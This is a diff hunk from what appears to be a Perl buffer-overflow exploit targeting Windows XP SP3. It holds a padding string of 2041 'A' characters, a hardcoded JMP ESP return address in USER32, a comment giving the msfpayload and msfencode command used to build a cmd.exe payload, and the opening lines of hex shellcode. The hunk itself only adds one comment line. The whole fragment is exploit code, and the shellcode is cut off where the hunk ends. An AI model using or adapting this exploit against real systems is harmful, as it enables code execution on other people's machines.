@@ -8,6 +8,7 @@ $payload.= "A" x 2041;
 $ret = "5393427e"; #JMP ESP USER32 XPSP3 without hex encoding
 #$shellcode = "cc" x 1978;
 #cmd.exe payload generated with msfpayload windows/exec CMD=cmd.exe R | msfencode -t perl | sed -e's/\\x//g'
+# turn hex characters into text hex
 $shellcode=
 "d9eed97424f45949494949494949" .
 "4949494343434343434337515a6a" .
